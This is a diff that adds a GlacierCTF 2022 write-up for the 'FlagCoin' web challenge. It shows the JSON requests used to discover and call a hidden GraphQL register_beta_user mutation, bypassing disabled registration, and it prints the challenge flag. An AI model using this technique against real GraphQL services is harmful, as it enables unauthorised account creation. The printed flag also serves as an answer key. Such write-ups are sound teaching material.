@@ -233,6 +233,48 @@ if __name__ == "__main__":
 
 # Web
 
+## FlagCoin
+
+*Our new 110% legit cryptocurrency is so cool, it does not even use blockchains. We have a WIP web interface for trading though. Hope nobody can get a beta testing account.*
+
+### Solution
+
+The fist thing we see is a simple login screen:
+![](/images/glacierctf2022_flagcoin_login.png)
+
+We can notice that the registration is disabled, so we can only log in existing profiles.
+Looking at the source code, we notice nothing special.
+
+Using **Burp Suite**, we can take a look at the performed request:
+```json
+{"query":"\n      mutation($username: String!, $password: String!) { \n        login(username: $username, password: $password) { \n          username \n        } \n      }\n      ","variables":{"username":"blabla","password":"ciaociao"}}
+```
+
+We notice that a **mutation** query is performed.
+That's the *key* to the solution.
+
+The idea was to gain the access to the *beta* account.
+
+That's how I did this:
+1. Using a tool ([GraphQL Map](https://github.com/swisskyrepo/GraphQLmap)), I discovered that there were 3 possible mutations: **login.query**, **redeem.query** (which comes in hand for stage 2) and **register_beta_user.query** (the one I was looking for)
+
+2. Opening the **register_beta_user.query** file, here is what I obtained:
+```json
+ {"query": "mutation {\n\tregister_beta_user(username:String, password:String) {\n\t\tusername\n\t\tpassword\n\t\tcoins\n\t}\n}"}
+```
+
+3. Now we can inject the request (again using *Burp*) to perform the *register_beta_user* query:
+```json
+{"query":"\n      mutation($username: String!, $password: String!) { \n        register_beta_user(username: $username, password: $password) { \n          username \n        } \n      }\n      ","variables":{"username":"beta","password":"tester"}}
+```
+
+4. Than we can login with the new account:
+![](/images/glacierctf2022_flagcoin_solved_login.png)
+
+After logging in, we are welcomed with the flag:
+`glacierctf{bUy_Th3_d1P_br0h}`
+
+
 ## RCE as a Service
 
 ### Stage 1
